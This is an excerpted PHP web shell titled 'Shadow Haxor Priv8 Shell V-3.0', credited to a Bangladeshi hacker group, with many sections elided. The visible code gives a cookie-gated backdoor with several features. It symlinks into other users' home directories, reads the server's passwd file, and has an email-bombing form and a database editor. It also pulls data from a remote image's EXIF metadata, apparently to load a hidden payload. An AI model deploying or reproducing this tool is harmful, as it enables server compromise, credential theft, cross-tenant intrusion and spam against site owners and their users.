...
$BASED = exif_read_data("https://lh3.googleusercontent.com/-8EIgmGTGGxk/V-snkZlMDtI/AAAAAAAAAjY/jU8NNyODblYobVOv4jDBjzRZYo2mvedtgCLcB/s530-p/Dhanush.jpg");
...
if(isset($_COOKIE['hacked']) && $_COOKIE['hacked']==md5($password))
{
	$self=$_SERVER["PHP_SELF"];
	$os = "N/D";
	$bdmessage = null;
...
else if(isset($_REQUEST['scriptlocator']))
{
	if(stristr(php_uname(),"Linux"))
	{
		...
		if(isset($_REQUEST['passwd']))
		{
			...
			echo "<br><center><a href=".$url."D4RKSPT target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		...
		if($d0mains)
		{
			...
			echo "<center><font class=txt size=3>[ Done ]</font></center>";
			echo "<br><center><a href=".$url."D4RKST target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>"; 
		}
		else
		{
			mkdir("D4RKSPT");
		...
		if(stristr(php_uname(),"Linux"))
		{
			...
			if ($TEST) 
			{
				...
				while(!feof($file))
				{
					...
					echo "<td align=center><font size=3 class=txt><a href=".$url."D4RK/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr>";
					$dcount++;
				}
				fclose($file);
...
else if(isset($_GET['bypassit']))
{
	...
	else if(isset($_GET['symlnk']))
	{
		...
		echo file_get_contents("http://" . $_SERVER['HTTP_HOST'] . "/myD4RK/passwd");
		echo "</textarea>";
	}
...
else if(isset($_GET['bomb']))
{
	...
	<table id="margins" style="width:100%;">
		...
		<tr>
			...
			<td>
				<input type="text" class="box" name="subject" value="D4RK Here!" onFocus="if(this.value == 'D4RK Here!')this.value = '';" onBlur="if(this.value=='')this.value='D4RK Here!';" />
			</td>
		</tr>
		 <tr>
		...
		<tr>
			<td colspan="2"><textarea name="message" cols="110" rows="10" class="box">Hello !! This is D4RK!!</textarea></td>
		</tr>
		<tr>
			<td rowspan="2">
        ...
        <form>
           <table align="left" style="width:100%;">
                ...
                <tr>
                    ...
                    <td style="width:80%;"><input type="text" class="box" name="subject" value="D4RK Here!!" onFocus="if(this.value == 'D4RK Here!!')this.value = '';" onBlur="if(this.value=='')this.value='D4RK Here!!';" /></td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="box">Hello !! This is D4RK!!!</textarea>
                    </td>
                </tr>
		 ...
		 <form method='post' >
            <table style="border-spacing: 6px;">
                ...
                <tr>
                    <td>Password </td>
                    <td>
						<input style="width: 200px;" class="box" name="passwd" value="D4RK"/>
					</td>
					<tr>
						<td>Using</td>
						<td>
		...
		if($_GET['action'] == "editData")
		{
			...
			for( $i = 0; $i < $num; $i++ ) 
			{
				...
				if( $type == "enum" || $type == "set" ) 
				{
					...
					{
						if( $len < 40 )
							echo "<td><input type=text size=40 maxlength=$len id=D4RK_$fieldname name=sql_$fieldname value=\"$value\" class=box></td>\n";
						else
							echo "<td><textarea cols=47 rows=3 maxlength=$len name=D4RK_$fieldname class=box>$value</textarea>\n";
					}
					$fundata1 .= "'D4RK_".$fieldname."',D4RK_".$fieldname.".value,";
					$fundata2 .= "'D4RK_".$fieldname."',D4RK_".$fieldname.".value,";
				echo "</tr>";
			}
...
function editdata()
{
   ...
   result = result.slice(0, -1);
	...
	var result=result.replace(/D4RK_/g,""); 
...
?>
<div align="center">
<a href="<?php $_SERVER['PHP_SELF'];?>"><font size="6" color="#FF0000" style="text-decoration:none;" face="Times New Roman, Times, serif">Shadow Haxor Priv8 Shell V-3.0</font></a>
...
<hr color="#1B1B1B">
<div align="center">
<font size="6" face="Times New Roman, Times, serif" color="#00CC00">
ErrOr SquaD Bangladeshi Hackers<br></font><br><a href="http://www.facebook.com/asiffarabi000" target="_blank"><font color="#FF0000" size="6">Coded by AsiF FaraBi</font></a></div>
<?php 
}	
}
...
{
    if( $_POST['uname'] == $username && $_POST['passwd'] == $password )
    {
         setcookie("hacked", md5($password));
...
?>
	...
	<div style="background-color:#171717; width:50%; border-radius:7px; margin-top:150px; -moz-border-radius:25px; height:410px; background-image:url(Windows_7_-_Alien_from_outer_space.jpg);">
		<table cellpadding="9" cellspacing="4">
			<tr>
				<td align="center" colspan="2"><blink><font size="7"><b>Shadow Haxor Priv8 Shell</b>
		</font></blink></td>
			</tr>
			<tr>
			...
			<tr>
				<td align="center" colspan="2"><font size="5" face="Times New Roman, Times, serif"><b>~~~Coded By:Shadow Haxor~~~</b></font></td>
			</tr>
			<tr>
